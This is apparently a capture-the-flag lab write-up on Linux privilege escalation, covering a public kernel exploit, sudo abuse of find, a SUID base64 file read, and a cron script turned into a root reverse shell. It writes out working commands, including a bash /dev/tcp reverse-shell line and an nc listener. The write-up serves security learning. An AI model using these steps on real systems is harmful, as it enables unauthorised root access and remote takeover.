# Privilege Escalation: Kernel Exploits

As the name suggests, the best way to start searching for a kernel exploit is to check the kernel version.

```
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

$ uname -a 
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

From this output we can see that the kernel version is:

3.13.0-24-generic

After searching, I found that this version has a public vulnerability: CVE-2015-1328.

Exploit available on Exploit-DB:
https://www.exploit-db.com/exploits/37292

I used the code from Exploit-DB to perform the exploitation. However, not every CVE has a public exploit, and sometimes the available code is incomplete or unstable.

```
$ nano exploit.c 
$ ls
exploit.c
$ gcc exploit.c -o exploit  
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)

$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

After running the exploit, we successfully gained root privileges.

In this exercise, we are looking for a specific file name. The best way to find it is to use the find command:

```
# find / -name flag1.txt
/home/matt/flag1.txt

# cat /home/matt/flag1.txt
THM-X
```
# Privilege Escalation: Sudo

As the name suggests, let’s check whether the user can use sudo.

```
$ sudo -l
Matching Defaults entries for karen on ip-10-67-179-12:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-67-179-12:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```

We can see that the user can run find, less, and nano as root without providing a password (NOPASSWD).

This means we can potentially escalate privileges using GTFOBins.

GTFOBins is a curated list of Unix-like binaries that can be abused to bypass local security restrictions in misconfigured systems.

Using the find binary, we can spawn a root shell:

```
$ sudo find . -exec /bin/sh \; -quit
# find / -name flag2.txt
/home/ubuntu/flag2.txt

# cat /home/ubuntu/flag2.txt
THM-X
```

Because find is executed with sudo, the spawned shell runs with root privileges, allowing us to access restricted files and fully compromise the system.

Misconfigured sudo permissions are one of the most common and easiest privilege escalation vectors in Linux systems.

# Privilege Escalation: SUID

If we don’t have permission to use sudo -l, we can look for SUID binaries instead.
To do that, we can use the following command:

```
find / -type f -perm -04000 -ls 2>/dev/null
```

SUID (Set User ID) is a special permission bit in Unix/Linux systems that makes a program run with the file owner’s privileges instead of the privileges of the user who launched it.

First, we confirm that sudo cannot be used:

```
$ sudo -l
[sudo] password for karen: 
Sorry, user karen may not run sudo on ip-10-65-154-239.
```

Now we search for SUID binaries:

```
$ find / -type f -perm -04000 -ls 2>/dev/null
...
/usr/bin/base64
/usr/bin/su
/usr/bin/mount
...
```

Among the listed binaries, we can see that /usr/bin/base64 has the SUID bit set.

After checking GTFOBins, we can confirm that base64 can be abused to read files with elevated privileges when it has the SUID bit set.

Let’s test access to the restricted file:

```
$ cat /home/ubuntu/flag3.txt
cat: /home/ubuntu/flag3.txt: Permission denied
```

Direct reading is not allowed. However, since base64 runs with root privileges (due to SUID), we can use it to read and decode the file:

```
$ base64 /home/ubuntu/flag3.txt | base64 --decode
THM-X
```

Because the binary executes with the file owner's privileges (root), it allows us to read files that are normally inaccessible.

# Privilege Escalation: Cron Jobs

CRON is a time-based job scheduler in Unix/Linux systems that automatically runs commands or scripts at specified times or intervals.

We can check which files are executed by cron using:

```
cat /etc/crontab
```

Example output:

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

We can see that /home/karen/backup.sh is executed every minute as root.

If we have write permissions to this file, we can modify it and achieve privilege escalation.

Target script:

```
$ cat /home/karen/backup.sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.134.207/6666 0>&1
$ chmod +x /home/karen/backup.sh
```

Here, we modified the script to initiate a reverse shell. Since cron runs it as root every minute, the reverse shell will also execute with root privileges.

Now we start a listener on our attacking machine:

```
$ nc -nvlp 6666
Listening on 0.0.0.0 6666
Connection received on 10.67.141.102 56760
bash: cannot set terminal process group (12509): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-67-141-102:~# cat /home/ubuntu/flag5.txt
cat /home/ubuntu/flag5.txt
THM-X
```

After the cron job executes, we receive a reverse shell as root.


